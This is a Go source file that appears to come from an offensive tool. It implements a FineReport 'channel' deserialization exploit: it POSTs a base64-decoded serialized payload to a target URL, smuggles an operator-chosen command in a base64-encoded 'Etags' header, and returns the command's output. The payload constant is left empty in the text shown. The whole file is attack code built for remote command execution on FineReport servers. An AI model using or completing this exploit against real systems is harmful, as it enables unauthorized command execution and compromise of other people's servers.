package finereport

import (
	"bytes"
	"encoding/base64"

	"github.com/qiwentaidi/clients"

	"github.com/go-resty/resty/v2"
)

const fr10cmd = ""

func ChannelDeserialize(url, cmd string, client *resty.Client) string {
	decodedBytes, err := base64.StdEncoding.DecodeString(fr10cmd)
	if err != nil {
		return "Error decoding base64: " + err.Error()
	}
	dataBytes := []byte(cmd)
	headers := map[string]string{
		"Etags": base64.StdEncoding.EncodeToString(dataBytes),
	}
	resp, err := clients.DoRequest("POST", url, headers, bytes.NewReader(decodedBytes), 10, client)
	if err != nil {
		return err.Error()
	}
	return string(resp.Body())
}
